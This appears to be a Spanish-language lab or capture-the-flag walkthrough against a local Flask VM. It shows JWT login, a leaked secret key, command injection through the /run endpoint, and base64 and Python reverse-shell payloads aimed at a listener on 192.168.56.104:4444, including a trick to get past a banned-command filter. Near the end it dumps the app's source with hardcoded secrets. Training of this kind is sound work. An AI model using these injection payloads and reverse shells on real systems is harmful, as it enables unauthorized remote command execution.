+Mientras eso corre en segundo plano (déjalo en una terminal aparte), probemos el registro/login con tu propio usuario de prueba — así avanzamos en dos frentes a la vez:
+
+Registrar un usuario propio
+En OTRA terminal (deja la de John corriendo), ejecuta: 'curl -X POST http://192.168.56.103:8080/registration -H "Content-Type: application/json" -d '{"username":"testuser","password":"Test1234!"}''.
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/registration -H "Content-Type: application/json" -d '{"username":"testuser","password":"Test1234!"}'
+{"message": "User testuser was created. Please use the login API to log in!", "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1MDY4OCwianRpIjoiM2M1YTQ0ZmUtNTE4YS00NWVkLWIzYzYtMzJiOWVlOWY4MjFjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3R1c2VyIiwibmJmIjoxNzg4NzUwNjg4LCJleHAiOjE3ODg3NTE1ODh9.M62JIK76-VRUQNLIBHFP28KbizIMFry_LyFfPTX3q0A"}
+                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/login -H "Content-Type: application/json" -d '{"username":"testuser","password":"Test1234!"}'  
+
+{"message": "Logged in as testuser", "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1MDgzNSwianRpIjoiMTg2ZDcyMGQtOTE2Yy00YmIxLWJhN2QtMDUyNWY1NGVhNWFlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3R1c2VyIiwibmJmIjoxNzg4NzUwODM1LCJleHAiOjE3ODg3NTE3MzV9.yN7hZ3XSXZxmHr-7B30qPb6PdXYGKmzwRCrohAL6LVc", "refresh_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1MDgzNSwianRpIjoiMjBjMjEyYTEtNmU5MC00NTlhLWIwODQtMDcwODM5YmQ5Yjc2IiwidHlwZSI6InJlZnJlc2giLCJzdWIiOiJ0ZXN0dXNlciIsIm5iZiI6MTc4ODc1MDgzNSwiZXhwIjoxNzg4NzU0NDM1fQ.gsmys3uoPL7hbiNsRPkaaiQEOpkbEgq8qNHZlznFgHQ"}
+                                 
+
+Tienes tu JWT. Ahora vamos a usarlo para acceder a los endpoints protegidos que encontramos (/run, /secret, y el post /3 que antes te rechazó):
+
+Guardar el JWT en una variable de entorno
+Para no copiar el token cada vez, guárdalo en una variable: 'TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1MDgzNSwianRpIjoiMTg2ZDcyMGQtOTE2Yy00YmIxLWJhN2QtMDUyNWY1NGVhNWFlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3R1c2VyIiwibmJmIjoxNzg4NzUwODM1LCJleHAiOjE3ODg3NTE3MzV9.yN7hZ3XSXZxmHr-7B30qPb6PdXYGKmzwRCrohAL6LVc"' (usa el access_token del login, no el de registro).
+
+
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1MDgzNSwianRpIjoiMTg2ZDcyMGQtOTE2Yy00YmIxLWJhN2QtMDUyNWY1NGVhNWFlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3R1c2VyIiwibmJmIjoxNzg4NzUwODM1LCJleHAiOjE3ODg3NTE3MzV9.yN7hZ3XSXZxmHr-7B30qPb6PdXYGKmzwRCrohAL6LVc"             
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Authorization: Bearer $TOKEN" http://192.168.56.103:8080/3
+{"message":"Who moved my cheese?","success":false}
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Authorization: Bearer $TOKEN" http://192.168.56.103:8080/3/edit
+{"message":"Who moved my cheese?","success":false}
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+Probar /secret con el token
+Ejecuta: 'curl -H "Authorization: Bearer $TOKEN" http://192.168.56.103:8080/secret' y observa si el error 500 cambia a algo más útil, o si pide un parámetro específico.
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -H "Authorization: Bearer $TOKEN" http://192.168.56.103:8080/secret
+{"message": "Internal Server Error"}
+
+Probar /run con POST y el token
+Ejecuta: 'curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{}'' (probamos POST vacío primero ya que GET dio 405). Si pide parámetros específicos, el mensaje de error normalmente los revela.
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{}'
+{"message":"Please provide URL to request in the form url:port. Example: 127.0.0.1:12345","success":false}
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+¡Excelente, este es el hallazgo clave! El endpoint /run es exactamente ese "proxy" que detectó nmap — recibe una URL/puerto y hace la petición por ti. Esto es un SSRF (Server-Side Request Forgery): puedes usar el propio servidor para acceder a servicios internos que normalmente no serían alcanzables desde fuera (como algo escuchando solo en 127.0.0.1).
+
+Probar el campo 'url' apuntando al propio servidor (puerto 80)
+Prueba: 'curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"127.0.0.1:80"}''. Estamos probando que el campo se llame literalmente 'url' con formato host:puerto (sin http://).
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"127.0.0.1:80"}'
+{"message":"We need your secret key!","success":false}
+
+
+Interesante giro — el endpoint /run ahora pide una "secret key" además de la URL. Eso conecta directamente con el endpoint /secret que nos dio error 500 antes. Vamos a investigar cómo obtener o generar esa clave:
+
+Ver qué métodos acepta /secret
+Ejecuta: 'curl -X OPTIONS -v http://192.168.56.103:8080/secret' y 'curl -X OPTIONS -v http://192.168.56.103:8080/run'. El header 'Allow' en la respuesta te dirá qué métodos HTTP acepta cada uno (GET, POST, PUT, etc.) — puede que /secret necesite POST en vez de GET.
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X OPTIONS -v http://192.168.56.103:8080/secret                                                      
+*   Trying 192.168.56.103:8080...
+* Established connection to 192.168.56.103 (192.168.56.103 port 8080) from 192.168.56.104 port 48452 
+* using HTTP/1.x
+> OPTIONS /secret HTTP/1.1
+> Host: 192.168.56.103:8080
+> User-Agent: curl/8.20.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Mon, 07 Sep 2026 03:33:47 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 0
+< Connection: keep-alive
+< Allow: GET, OPTIONS, HEAD
+< 
+* Connection #0 to host 192.168.56.103:8080 left intact
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ curl -X OPTIONS -v http://192.168.56.103:8080/run   
+*   Trying 192.168.56.103:8080...
+* Established connection to 192.168.56.103 (192.168.56.103 port 8080) from 192.168.56.104 port 55264 
+* using HTTP/1.x
+> OPTIONS /run HTTP/1.1
+> Host: 192.168.56.103:8080
+> User-Agent: curl/8.20.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Mon, 07 Sep 2026 03:34:09 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 0
+< Connection: keep-alive
+< Allow: POST, OPTIONS
+< 
+* Connection #0 to host 192.168.56.103:8080 left intact
+
+
+Probar /secret con POST y cuerpo vacío
+Prueba: 'curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/secret -d '{}''. Si el error cambia (de 500 a algo más específico, como 'falta un campo'), estamos más cerca.
+
+curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/secret -d '{}'
+
+
+Probar agregando un campo 'key' de prueba en /run
+Agrega el campo 'key' a tu petición a /run con un valor de prueba para ver si el mensaje de error cambia (de 'necesitamos tu secret key' a algo como 'clave incorrecta'), lo cual confirmaría el nombre exacto del campo: 'curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"127.0.0.1:80","key":"test"}''.
+
+
+
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/secret -d '{}'
+{"message": "The method is not allowed for the requested URL."}
+                                                                  
+Revisar encabezados completos del error 500
+Ejecuta: 'curl -v -H "Authorization: Bearer $TOKEN" http://192.168.56.103:8080/secret' (con -v para ver TODOS los encabezados de respuesta, no solo el cuerpo). A veces los frameworks agregan un header revelador en errores 500, como 'X-Debug' o cookies de sesión nuevas.
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -v -H "Authorization: Bearer $TOKEN" http://192.168.56.103:8080/secret
+*   Trying 192.168.56.103:8080...
+* Established connection to 192.168.56.103 (192.168.56.103 port 8080) from 192.168.56.104 port 50802 
+* using HTTP/1.x
+> GET /secret HTTP/1.1
+> Host: 192.168.56.103:8080
+> User-Agent: curl/8.20.0
+> Accept: */*
+> Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1MDgzNSwianRpIjoiMTg2ZDcyMGQtOTE2Yy00YmIxLWJhN2QtMDUyNWY1NGVhNWFlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3R1c2VyIiwibmJmIjoxNzg4NzUwODM1LCJleHAiOjE3ODg3NTE3MzV9.yN7hZ3XSXZxmHr-7B30qPb6PdXYGKmzwRCrohAL6LVc
+> 
+* Request completely sent off
+< HTTP/1.1 500 INTERNAL SERVER ERROR
+< Server: nginx/1.14.2
+< Date: Mon, 07 Sep 2026 03:37:28 GMT
+< Content-Type: application/json
+< Content-Length: 37
+< Connection: keep-alive
+< 
+{"message": "Internal Server Error"}
+* Connection #0 to host 192.168.56.103:8080 left intact
+
+
+El problema con /secret no era el token en sí, sino cómo lo estabas enviando. El autor probó con Authorization: Bearer (como tú) y tampoco funcionó — el truco fue enviar el JWT como cookie, no como header. Esto tiene sentido porque flask-jwt-extended (la librería que vimos mencionada en el post "Useful Links") soporta JWT tanto en headers como en cookies, y /secret específicamente espera la cookie.
+
+Enviar el JWT como cookie en vez de header
+flask-jwt-extended por defecto nombra la cookie 'access_token_cookie'. Prueba: 'curl -v --cookie "access_token_cookie=$TOKEN" http://192.168.56.103:8080/secret'. Nota que aquí usamos '--cookie' en vez de '-H "Authorization: Bearer..."'.
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -v --cookie "access_token_cookie=$TOKEN" http://192.168.56.103:8080/secret
+*   Trying 192.168.56.103:8080...
+* Established connection to 192.168.56.103 (192.168.56.103 port 8080) from 192.168.56.104 port 43818 
+* using HTTP/1.x
+> GET /secret HTTP/1.1
+> Host: 192.168.56.103:8080
+> User-Agent: curl/8.20.0
+> Accept: */*
+> Cookie: access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1MDgzNSwianRpIjoiMTg2ZDcyMGQtOTE2Yy00YmIxLWJhN2QtMDUyNWY1NGVhNWFlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3R1c2VyIiwibmJmIjoxNzg4NzUwODM1LCJleHAiOjE3ODg3NTE3MzV9.yN7hZ3XSXZxmHr-7B30qPb6PdXYGKmzwRCrohAL6LVc
+> 
+* Request completely sent off
+< HTTP/1.1 500 INTERNAL SERVER ERROR
+< Server: nginx/1.14.2
+< Date: Mon, 07 Sep 2026 04:07:18 GMT
+< Content-Type: application/json
+< Content-Length: 37
+< Connection: keep-alive
+< 
+{"message": "Internal Server Error"}
+* Connection #0 to host 192.168.56.103:8080 left intact
+
+Se actualiza el token porque pasaron minutos en pruebas anteriores.
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -v --cookie "access_token_cookie=$TOKEN" http://192.168.56.103:8080/secret
+*   Trying 192.168.56.103:8080...
+* Established connection to 192.168.56.103 (192.168.56.103 port 8080) from 192.168.56.104 port 48368 
+* using HTTP/1.x
+> GET /secret HTTP/1.1
+> Host: 192.168.56.103:8080
+> User-Agent: curl/8.20.0
+> Accept: */*
+> Cookie: access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1NDE2OSwianRpIjoiMWNjYjVmYTUtYjNlMS00Zjg2LTg4NWUtNTRkMGI0NmUwNjk0IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3R1c2VyIiwibmJmIjoxNzg4NzU0MTY5LCJleHAiOjE3ODg3NTUwNjl9.TQl4t8lqNNuRE-7BwRMau1TYcNokVhruT-IXv4Bvbjk
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Mon, 07 Sep 2026 04:11:20 GMT
+< Content-Type: application/json
+< Content-Length: 61
+< Connection: keep-alive
+< Set-Cookie: access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1NDI4MCwianRpIjoiOGRlMDMzZTgtMDRhYS00YzkyLTlkM2YtNGFhZjI0ZTQ0YWJjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3R1c2VyIiwibmJmIjoxNzg4NzU0MjgwLCJleHAiOjE3ODg3NTUxODB9.KVckMAZ08fTlnRA4QZhGDCb7masHzy-yo-e4tfqpKpc; Secure; HttpOnly; Path=/
+< 
+{"ip-address": "", "secret_key": "commandexecutionissecret"}
+* Connection #0 to host 192.168.56.103:8080 left intact
+
+¡Excelente, funcionó! Tienes la secret key: commandexecutionissecret — y fíjate en el nombre, ya nos está diciendo qué hace /run: ejecución de comandos. Vamos a usarla:
+
+Ejecuta: 'curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"127.0.0.1:80","secret_key":"commandexecutionissecret"}''. Usamos exactamente el nombre de campo 'secret_key' que vimos en la respuesta de /secret.
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"127.0.0.1:80","secret_key":"commandexecutionissecret"}'
+{"message":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   411  100   411    0     0  58714      0 --:--:-- --:--:-- --:--:--  100k\n","success":false}
+
+Excelente, confirmado: el servidor realmente ejecuta curl por detrás (ves literalmente la salida de progreso de curl en la respuesta). Esto es justo lo que necesitábamos — ahora probemos si podemos inyectar comandos adicionales aprovechando que el valor de url probablemente se pasa sin sanitizar a una shell:
+
+
+Probar inyección con punto y coma
+Prueba: 'curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"127.0.0.1:80;id","secret_key":"commandexecutionissecret"}''. El punto y coma separa comandos en bash — si el 'url' se pasa sin escapar a una shell, esto ejecutaría 'id' después del curl.
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"127.0.0.1:80 && id","secret_key":"commandexecutionissecret"}'
+{"message":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   411  100   411    0     0   133k      0 --:--:-- --:--:-- --:--:--  133k\n","success":false}
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"127.0.0.1:80 | id","secret_key":"commandexecutionissecret"}'
+{"message":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   411  100   411    0     0   133k      0 --:--:-- --:--:-- --:--:--  133k\n(23) Failed writing body\n","success":false}
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"`id`","secret_key":"commandexecutionissecret"}'
+{"message":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: uid=1000(patrick)\ncurl: (6) Could not resolve host: gid=33(www-data)\ncurl: (6) Could not resolve host: groups=33(www-data),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)\n","success":false}
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" http://192.168.56.103:8080/run -d '{"url":"$(id)","secret_key":"commandexecutionissecret"}'
+{"message":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: uid=1000(patrick)\ncurl: (6) Could not resolve host: gid=33(www-data)\ncurl: (6) Could not resolve host: groups=33(www-data),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)\n","success":false}
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+🎉 ¡Confirmado RCE (Ejecución Remota de Comandos)! La salida uid=1000(patrick) gid=33(www-data) groups=... prueba que puedes ejecutar comandos arbitrarios en el servidor a través de la inyección en /run. Esto es un hallazgo crítico — anótalo en el informe con el payload exacto que funcionó (los backticks/$()).
+
+Preparar un listener de netcat en Kali
+En una terminal NUEVA de Kali (deja las demás abiertas), pon un listener esperando la conexión de vuelta: 'nc -lvnp 4444'. Esto se queda esperando indefinidamente hasta que algo se conecte.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+
+
+Generamos un nuevo token de sesión, porque ya había pasado tiempo del anterior
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser","password":"Test1234!"}'
+{"message": "Logged in as testuser", "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1NTg4OSwianRpIjoiMzhmNjlmYTgtMWRjYS00ZjM1LWFlYTItY2VkYjljMThlMDYyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3R1c2VyIiwibmJmIjoxNzg4NzU1ODg5LCJleHAiOjE3ODg3NTY3ODl9.Rsq4SwdkPEehkw2_Qy-VUNVcjqQIlZFrmceHw5s0kqE", "refresh_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc4ODc1NTg4OSwianRpIjoiNzFhNDI2ZTItMzBmMS00NmE0LTg3M2YtYzBjN2Y3MjE5MWYwIiwidHlwZSI6InJlZnJlc2giLCJzdWIiOiJ0ZXN0dXNlciIsIm5iZiI6MTc4ODc1NTg4OSwiZXhwIjoxNzg4NzU5NDg5fQ.btLK0E66JxoZQANEv0C1I1bz5DcDZbVVyZDTaLw-3b0"}
+                                                                                                   
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/run \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"127.0.0.1:80; bash -c \"bash -i >& /dev/tcp/192.168.56.104/4444 0>&1\"", "secret_key":"commandexecutionissecret"}'
+{"message":"Banned command!","success":false}
+
+Ese mensaje de respuesta {"message":"Banned command!","success":false} confirma que el servidor tiene un filtro que detecta cadenas prohibidas como bash, /dev/tcp o caracteres especiales.
+
+Para evadir esta restricción (WAF/Filtro de comandos), debes codificar el payload en Base64 antes de enviarlo.
+
+Probar la Ejecución con Base64:
+Una vez que tengas el $TOKEN activo, envía la reverse shell en Base64 al endpoint /run usando la clave key:
+
+
+                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ echo -n "bash -i >& /dev/tcp/192.168.56.104/4444 0>&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNC80NDQ0IDA+JjE=
+                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/run \                  
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"127.0.0.1:80; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNC80NDQ0IDA+JjE= | base64 -d | sh", "secret_key":"commandexecutionissecret"}'
+{"message":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   411  100   411    0     0  34250      0 --:--:-- --:--:-- --:--:-- 58714\nsh: 1: Syntax error: Bad fd number\n","success":false}
+
+
+El error sh: 1: Syntax error: Bad fd number ocurre porque el comando se ejecuta en /bin/sh (Dash en Debian), el cual no entiende la sintaxis de redirección >& ni /dev/tcp.
+
+Para resolver esto, codificaremos una Reverse Shell en Python 3, que es totalmente nativa en este entorno Flask.
+
+Paso 1: Generar el Payload en Python y Base64
+En tu Kali Linux, ejecuta exactamente este comando para codificar una reverse shell de Python:
+
+Bash
+echo -n 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.104",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' | base64 -w 0
+Obtendrás esta cadena en Base64:
+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCBzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNTYuMTA0Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTs=
+
+
+
+
+No funcionó lo anterior
+
+probamos ahora aprovechar una inyección de comandos combinada con banderas de línea de comandos (curl).
+
+Mecánica de la Inyección (-h|id;)
+
+El servidor procesa el parámetro concatenándolo directamente en una shell del sistema (como os.system o subprocess con shell=True):
+
+Paso 1: Confirmar ejecución de comandos
+Ejecuta este comando en tu terminal para verificar que la inyección responde como el usuario patrick:
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/run \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"-h|id;", "secret_key":"commandexecutionissecret"}'
+{"message":"uid=1000(patrick) gid=33(www-data) groups=33(www-data),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)\n","success":true}
+
+
+Paso 2: Listar el contenido del directorio
+Listamos los archivos del directorio de la aplicación web para localizar el archivo app.py:                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/run \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"-h|ls -la;", "secret_key":"commandexecutionissecret"}'
+{"message":"total 92\ndrwxr-xr-x  7 patrick patrick   4096 Sep  7 11:11 .\ndrwxr-xr-x 20 patrick patrick   4096 Aug 18  2021 ..\n-rw-r--r--  1 patrick patrick  12288 Sep  7 11:11 app.db\n-rw-r--r--  1 patrick patrick   6857 Aug 16  2021 app.py\n-rw-r--r--  1 patrick patrick  12288 Sep  7 10:47 database.db\ndrwxr-xr-x  5 patrick patrick   4096 Jun 23  2021 flaskapi\ndrwxr-xr-x  5 patrick patrick   4096 Jun 23  2021 flask_blog\nsrwxrwx---  1 patrick www-data     0 Sep  7 09:50 flask_blog.sock\n-rw-r--r--  1 patrick patrick    105 Jun 19  2021 hello.py\n-rw-r--r--  1 patrick patrick    472 Jun 19  2021 init_db.py\n-rw-r--r--  1 patrick patrick      0 Jun 22  2021 library.db\n-rw-r--r--  1 patrick patrick   1271 Jun 23  2021 models.py\n-rw-r--r--  1 patrick www-data     0 Sep  7 12:49 output.txt\ndrwxr-xr-x  2 patrick patrick   4096 Aug 16  2021 __pycache__\n-rw-r--r--  1 patrick patrick     64 Jun 23  2021 requirements.txt\n-rw-r--r--  1 patrick patrick   4925 Jun 29  2021 resources.py\n-rw-r--r--  1 patrick patrick    204 Jun 19  2021 schema.sql\ndrwxr-xr-x  3 patrick patrick   4096 Jun 19  2021 static\ndrwxr-xr-x  2 patrick patrick   4096 Jun 23  2021 templates\n-rw-r--r--  1 patrick patrick      0 Jun 23  2021 views.py\n-rw-r--r--  1 patrick patrick     76 Jun 24  2021 wsgi.py\n","success":true}
+
+Paso 3: Leer el archivo app.py
+Inspecciona el código fuente de app.py para revisar qué comandos tiene bloqueados el filtro o si contiene credenciales/rutas interesantes:
+
+
+                                                                                                                                
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.56.103:8080/run \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"-h|cat app.py;", "secret_key":"commandexecutionissecret"}'
+{"message":"import sqlite3\nimport json\n\nfrom flask import Flask, render_template, request, url_for, flash, redirect, jsonify, make_response, abort\nfrom werkzeug.exceptions import abort\nfrom functools import wraps\nfrom flask_restful import Resource, Api\nfrom flask_sqlalchemy import SQLAlchemy\n\nfrom datetime import datetime\nfrom datetime import timedelta\nfrom datetime import timezone\n\nfrom flask_jwt_extended import create_access_token\nfrom flask_jwt_extended import create_refresh_token\nfrom flask_jwt_extended import get_jwt\nfrom flask_jwt_extended import get_jwt_identity\nfrom flask_jwt_extended import jwt_required\nfrom flask_jwt_extended import JWTManager\nfrom flask_jwt_extended import set_access_cookies\nfrom flask_jwt_extended import unset_jwt_cookies\n\nfrom subprocess import Popen, TimeoutExpired, PIPE\n\ndef get_db_connection():\n    conn = sqlite3.connect('database.db')\n    conn.row_factory = sqlite3.Row\n    return conn\n\ndef get_post(post_id):\n    conn = get_db_connection()\n    post = conn.execute('SELECT * FROM posts WHERE id = ?',\n                        (post_id,)).fetchone()\n    conn.close()\n    if post is None:\n        abort(404)\n    return post\n\napp = Flask(__name__)\napi = Api(app)\napp.config['SECRET_KEY'] = 'snakeoilisnotgoodforcorporations'\napp.config['JWT_COOKIE_SECURE'] = True\napp.config['JWT_SECRET_KEY'] = 'NOreasonableDOUBTthisPASSWORDisGOOD'\napp.config['JWT_ACCESS_TOKEN_EXPIRES'] = timedelta(minutes=15)\napp.config['JWT_REFRESH_TOKEN_EXPIRES'] = timedelta(hours=1)\napp.config['JWT_TOKEN_LOCATION'] = ['cookies']\napp.config['JWT_COOKIE_CSRF_PROTECT'] = False # development setting!\n\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///app.db'\napp.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n\ndb = SQLAlchemy(app)\n\njwt = JWTManager(app)\n\n# initialisation of internal section\n\n@app.before_first_request\ndef create_tables():\n    db.create_all()\n\n# refresh JWT\n\n@app.after_request\ndef refresh_expiring_jwts(response):\n    try:\n        exp_timestamp = get_jwt()[\"exp\"]\n        now = datetime.now(timezone.utc)\n        target_timestamp = datetime.timestamp(now + timedelta(minutes=30))\n        if target_timestamp > exp_timestamp:\n            access_token = create_access_token(identity=get_jwt_identity())\n            set_access_cookies(response, access_token)\n        return response\n    except (RuntimeError, KeyError):\n        # Case where there is not a valid JWT. Just return the original respone\n        return response\n\n# external functions\n\n@app.route('/')\n\ndef index():\n    conn = get_db_connection()\n    posts = conn.execute('SELECT * FROM posts').fetchall()\n    conn.close()\n    return render_template('index.html', posts=posts)\n\n@app.route('/<int:post_id>') # write int so we don't get a SQLi!\n\ndef post(post_id):\n    post = get_post(post_id)\n    return render_template('post.html', post=post)\n\n@app.route('/create', methods=('GET', 'POST'))\n\ndef create():\n\n    if request.method == 'POST':\n        title = request.form['title']\n        content = request.form['content']\n\n        if not title:\n            flash('Title is required!')\n        else:\n            conn = get_db_connection()\n            conn.execute('INSERT INTO posts (title, content) 